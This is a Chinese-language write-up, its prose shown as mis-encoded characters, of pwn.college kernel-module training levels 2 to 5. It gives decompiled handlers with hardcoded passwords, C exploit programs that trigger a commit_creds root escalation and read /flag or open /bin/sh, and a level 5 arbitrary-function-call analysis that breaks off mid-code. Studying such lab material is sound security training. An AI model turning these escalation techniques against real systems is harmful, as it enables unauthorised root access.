href="#leave2-0-leave2-1" class="headerlink" title="leave2.0&amp;&amp;leave2.1"></a>leave2.0&amp;&amp;leave2.1</h1><p>å…ˆçœ‹ç¨‹åºä¸€æ ·çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  v0 = filp_open(<span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">  kernel_read(v0, flag, <span class="number">128</span>, v0 + <span class="number">104</span>);</span><br><span class="line">  filp_close(v0, <span class="number">0</span>);</span><br><span class="line">  proc_entry = (proc_dir_entry *)proc_create(<span class="string">&quot;pwncollege&quot;</span>, <span class="number">438</span>, <span class="number">0</span>, &amp;fops);</span><br><span class="line">  printk(&amp;unk_79C);</span><br><span class="line">  printk(&amp;unk_5D8);</span><br><span class="line">  printk(&amp;unk_79C);</span><br><span class="line">  printk(&amp;unk_608);</span><br><span class="line">  printk(&amp;unk_670);</span><br><span class="line">  printk(&amp;unk_6D0);</span><br><span class="line">  printk(&amp;unk_718);</span><br><span class="line">  printk(&amp;unk_7A3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">.data:<span class="number">0000000000000920</span> fops            file_operations &lt;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, offset device_write, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,\</span><br><span class="line">.data:<span class="number">0000000000000920</span>                                         ; DATA XREF: init_module+<span class="number">4</span>Aâ†‘o</span><br><span class="line">.data:<span class="number">0000000000000920</span>                                  <span class="number">0</span>, <span class="number">0</span>, offset device_open, <span class="number">0</span>, offset device_release, \</span><br><span class="line">.data:<span class="number">0000000000000920</span>                                  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt;</span><br><span class="line">.data:<span class="number">0000000000000920</span> _data           ends</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¼šè°ƒç”¨device_write.é‚£ä¹ˆæ¥ä¸‹æ¥æŸ¥çœ‹device_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">device_write</span><span class="params">(file *file, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> password[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line">  printk(&amp;unk_598);</span><br><span class="line">  v5 = <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= <span class="number">0x10</span> )</span><br><span class="line">    v5 = length;</span><br><span class="line">  copy_from_user(password, buffer, v5);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password, <span class="string">&quot;kfjplhjtylqmntng&quot;</span>, <span class="number">0x10u</span>) )</span><br><span class="line">    printk(&amp;format); <span class="comment">//printk == printf ä¸è¿‡æ˜¯æ‰“å°åœ¨æ—¥å¿—é‡Œé¢</span></span><br><span class="line">  <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œidaå‡ºç°äº†é—®é¢˜ï¼Œæ²¡æœ‰æŠŠ2å‚æ”¾å‡ºæ¥ï¼ŒæŸ¥çœ‹æ±‡ç¼–å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.rodata.str1.1:0000000000000778 format          db    1                 ; DATA XREF: device_write+6Câ†‘o</span><br><span class="line">.rodata.str1.1:0000000000000779                 db  36h ; 6</span><br><span class="line">.rodata.str1.1:000000000000077A                 db  54h ; T</span><br><span class="line">.rodata.str1.1:000000000000077B                 db  68h ; h</span><br><span class="line">.rodata.str1.1:000000000000077C                 db  65h ; e</span><br><span class="line">.rodata.str1.1:000000000000077D                 db  20h</span><br><span class="line">.rodata.str1.1:000000000000077E                 db  66h ; f</span><br><span class="line">.rodata.str1.1:000000000000077F                 db  6Ch ; l</span><br><span class="line">.rodata.str1.1:0000000000000780                 db  61h ; a</span><br><span class="line">.rodata.str1.1:0000000000000781                 db  67h ; g</span><br><span class="line">.rodata.str1.1:0000000000000782                 db  20h</span><br><span class="line">.rodata.str1.1:0000000000000783                 db  69h ; i</span><br><span class="line">.rodata.str1.1:0000000000000784                 db  73h ; s</span><br><span class="line">.rodata.str1.1:0000000000000785                 db  3Ah ; :</span><br><span class="line">.rodata.str1.1:0000000000000786                 db  20h</span><br><span class="line">.rodata.str1.1:0000000000000787                 db  25h ; %</span><br><span class="line">.rodata.str1.1:0000000000000788                 db  73h ; s</span><br><span class="line">.rodata.str1.1:0000000000000789                 db  0Ah</span><br><span class="line"></span><br><span class="line">================================================================================================================</span><br><span class="line">.text.unlikely:0000000000000511                 mov     rsi, offset flag</span><br><span class="line">.text.unlikely:0000000000000518                 mov     rdi, offset format ; å¯ä»¥çœ‹åˆ°ï¼Œä¼šæŠŠflagå½“æˆäºŒå‚æ‰“å°å‡ºæ¥</span><br><span class="line">.text.unlikely:000000000000051F                 call    printk          ; PIC mode</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_Flag_Path  <span class="string">&quot;/proc/pwncollege&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">char</span> * Passwd = <span class="string">&quot;kfjplhjtylqmntng&quot;</span>;</span><br><span class="line">        <span class="type">int</span> fd = open(get_Flag_Path,O_WRONLY);</span><br><span class="line">       <span class="keyword">if</span> (fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;OPEN ERROR check you File !!!</span></span><br><span class="line"><span class="string"> And you fd is %d</span></span><br><span class="line"><span class="string">&quot;</span>,fd);</span><br><span class="line">       &#125;</span><br><span class="line">      <span class="keyword">if</span> (write(fd,Passwd,<span class="built_in">strlen</span>(Passwd))&gt;<span class="number">0</span>)&#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Fd is %d,You Are Win&quot;</span>,fd);</span><br><span class="line">      &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æœ€ådmesg | tail -n 20,å¯ä»¥çœ‹åˆ°flag</span></span><br></pre></td></tr></table></figure><h1 id="leave3-0-leave3-1"><a href="#leave3-0-leave3-1" class="headerlink" title="leave3.0&amp;&amp;leave3.1"></a>leave3.0&amp;&amp;leave3.1</h1><p>åˆ†æä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  proc_entry = (proc_dir_entry *)proc_create(<span class="string">&quot;pwncollege&quot;</span>, <span class="number">438</span>, <span class="number">0</span>, &amp;fops);</span><br><span class="line">  printk(&amp;unk_1041);</span><br><span class="line">  printk(&amp;unk_E78);</span><br><span class="line">  printk(&amp;unk_1041);</span><br><span class="line">  printk(&amp;unk_EA8);</span><br><span class="line">  printk(&amp;unk_F10);</span><br><span class="line">  printk(&amp;unk_F70);</span><br><span class="line">  printk(&amp;unk_FB8);</span><br><span class="line">  printk(&amp;unk_1048);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">.data:<span class="number">00000000000011</span>A0 fops            file_operations &lt;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, offset device_write, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,\</span><br><span class="line">.data:<span class="number">00000000000011</span>A0                                         ; DATA XREF: init_moduleâ†‘o</span><br><span class="line">.data:<span class="number">00000000000011</span>A0                                  <span class="number">0</span>, <span class="number">0</span>, offset device_open, <span class="number">0</span>, offset device_release, \</span><br><span class="line">.data:<span class="number">00000000000011</span>A0                                  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">device_write</span><span class="params">(file *file, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> password[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line">  printk(&amp;unk_E38);</span><br><span class="line">  v5 = <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= <span class="number">0x10</span> )</span><br><span class="line">    v5 = length;</span><br><span class="line">  copy_from_user(password, buffer, v5);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(password, <span class="string">&quot;sfvzlmiqphywsyfk&quot;</span>, <span class="number">0x10u</span>) )</span><br><span class="line">    win();</span><br><span class="line">  <span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_DF8);</span><br><span class="line">  v0 = prepare_kernel_cred(<span class="number">0</span>); </span><br><span class="line">  commit_creds(v0);<span class="comment">//å€¼å¾—æ³¨æ„çš„ æ˜¯è¿™ä¸¤è¡Œä»£ç  ä¼šææƒï¼Œæå‡è‡³rootæƒé™</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å…¶å®å¾ˆç®€å•äº†ï¼Œ</p><p>æˆ‘ä»¬åªè¦è¾“å…¥å¯†ç ï¼Œå°±ä¼šæ­£å¸¸çš„è¿›å…¥win,ä½¿å¾—æˆ‘ä»¬çš„æƒé™æå‡è‡³root,ä»è€Œå¯ä»¥æ‹¿åˆ°flag</p><p>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_Flag_Path  <span class="string">&quot;/proc/pwncollege&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">char</span> * Passwd = <span class="string">&quot;sfvzlmiqphywsyfk&quot;</span>;</span><br><span class="line">        <span class="type">int</span> fd = open(get_Flag_Path,O_WRONLY);</span><br><span class="line">       <span class="keyword">if</span> (fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;OPEN ERROR check you File !!!</span></span><br><span class="line"><span class="string"> And you fd is %d</span></span><br><span class="line"><span class="string">&quot;</span>,fd);</span><br><span class="line">       &#125;</span><br><span class="line">      <span class="keyword">if</span> (write(fd,Passwd,<span class="built_in">strlen</span>(Passwd))&gt;<span class="number">0</span>)&#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Fd is %d,You Are Win&quot;</span>,fd);</span><br><span class="line">      &#125;</span><br><span class="line">      system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>leave3.1åŒç†</p><h1 id="leave4-0-leave4-1"><a href="#leave4-0-leave4-1" class="headerlink" title="leave4.0&amp;&amp;leave4.1"></a>leave4.0&amp;&amp;leave4.1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  proc_entry = (proc_dir_entry *)proc_create(<span class="string">&quot;pwncollege&quot;</span>, <span class="number">438</span>, <span class="number">0</span>, &amp;fops);</span><br><span class="line">  printk(&amp;unk_531);</span><br><span class="line">  printk(&amp;unk_328);</span><br><span class="line">  printk(&amp;unk_531);</span><br><span class="line">  printk(&amp;unk_358);</span><br><span class="line">  printk(&amp;unk_3C0);</span><br><span class="line">  printk(&amp;unk_420);</span><br><span class="line">  printk(&amp;unk_460);</span><br><span class="line">  printk(&amp;unk_4A8);</span><br><span class="line">  printk(&amp;unk_538);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000680 fops            file_operations &lt;0, 0, 0, 0, 0, 0, 0, 0, 0, 0, offset device_ioctl, 0,\</span><br><span class="line">.data:0000000000000680                                         ; DATA XREF: init_moduleâ†‘o</span><br><span class="line">.data:0000000000000680                                  0, 0, offset device_open, 0, offset device_release, \</span><br><span class="line">.data:0000000000000680                                  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¼šè°ƒç”¨device_ioctlï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">device_ioctl</span><span class="params">(file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">char</span> password[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28u</span>);</span><br><span class="line">  printk(&amp;unk_2F8);</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">1337</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(password, arg, <span class="number">16</span>);</span><br><span class="line">    v5 = <span class="built_in">strncmp</span>(password, <span class="string">&quot;czmepuekljhzwqou&quot;</span>, <span class="number">0x10u</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      win();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•ä»‹ç»ä¸€ä¸‹ioctlå‡½æ•°</p><p><code>ioctl</code> æ˜¯ä¸€ä¸ªä¸“ç”¨äºè®¾å¤‡è¾“å…¥è¾“å‡ºæ“ä½œçš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå…¶è°ƒç”¨æ–¹å¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> request, ...)</span></span><br></pre></td></tr></table></figure><p>å…¶<strong>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ‰“å¼€è®¾å¤‡ (open) è¿”å›çš„ <a href="http://m4x.fun/post/play-with-file-descriptor-1/">æ–‡ä»¶æè¿°ç¬¦</a></strong>ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º<strong>ç”¨æˆ·ç¨‹åºå¯¹è®¾å¤‡çš„æ§åˆ¶å‘½ä»¤</strong>ï¼Œå†åè¾¹çš„å‚æ•°åˆ™æ˜¯ä¸€äº›è¡¥å……å‚æ•°ï¼Œä¸è®¾å¤‡æœ‰å…³ã€‚</p><p>å¯¹äºä¸€ä¸ªæä¾›äº† ioctl é€šä¿¡æ–¹å¼çš„è®¾å¤‡è€Œè¨€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å…¶æ–‡ä»¶æè¿°ç¬¦ã€ä½¿ç”¨ä¸åŒçš„è¯·æ±‚ç åŠå…¶ä»–è¯·æ±‚å‚æ•°é€šè¿‡ ioctl ç³»ç»Ÿè°ƒç”¨å®Œæˆä¸åŒçš„å¯¹è®¾å¤‡çš„ I&#x2F;O æ“ä½œã€‚</p><p>è€Œåœ¨è¿™é‡Œè¦æ±‚äº†cmdæ˜¯1337ï¼šä¹‹åå°±ä¼šè§¦å‘æ¯”è¾ƒï¼Œå¯†ç Trueå°±ä¼šè¿›å…¥winï¼›</p><p>æ‰€ä»¥ï¼Œå¾ˆç®€å•äº† ï¼š exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> file_Path <span class="string">&quot;/proc/pwncollege&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD 1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Passwd <span class="string">&quot;czmepuekljhzwqou&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(file_Path, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd&lt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;File is Error! plase choose true file-path!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ioctl(fd, CMD,Passwd);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>leave4.1åŒä¸Š</p><h1 id="leave5-0-leave5-1"><a href="#leave5-0-leave5-1" class="headerlink" title="leave5.0&amp;&amp;leave5.1"></a>leave5.0&amp;&amp;leave5.1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  proc_entry = (proc_dir_entry *)proc_create(<span class="string">&quot;pwncollege&quot;</span>, <span class="number">438</span>, <span class="number">0</span>, &amp;fops);</span><br><span class="line">  printk(&amp;unk_C5B);</span><br><span class="line">  printk(&amp;unk_A08);</span><br><span class="line">  printk(&amp;unk_C5B);</span><br><span class="line">  printk(&amp;unk_A38);</span><br><span class="line">  printk(&amp;unk_AA0);</span><br><span class="line">  printk(&amp;unk_B00);</span><br><span class="line">  printk(&amp;unk_B40);</span><br><span class="line">  printk(&amp;unk_B88);</span><br><span class="line">  printk(&amp;unk_BF8);</span><br><span class="line">  printk(&amp;unk_C62);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000000DA0 fops            file_operations &lt;0, 0, 0, 0, 0, 0, 0, 0, 0, 0, offset device_ioctl, 0,\</span><br><span class="line">.data:0000000000000DA0                                         ; DATA XREF: init_moduleâ†‘o</span><br><span class="line">.data:0000000000000DA0                                  0, 0, offset device_open, 0, offset device_release, \</span><br><span class="line">.data:0000000000000DA0                                  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">device_ioctl</span><span class="params">(file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_998);</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">1337</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="type">void</span> *, file *))arg)(&amp;unk_998, file); <span class="comment">// è¿™é‡Œå…¶å®éœ€è¦è§£é‡Šä¸€ä¸‹ï¼Œargæ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œä¼šæŠŠç¬¬ä¸‰ä¸ªå‚æ•°å½“æˆå‡½æ•°åœ°å€å»è§£æ</span></span><br><span class="line">    <span 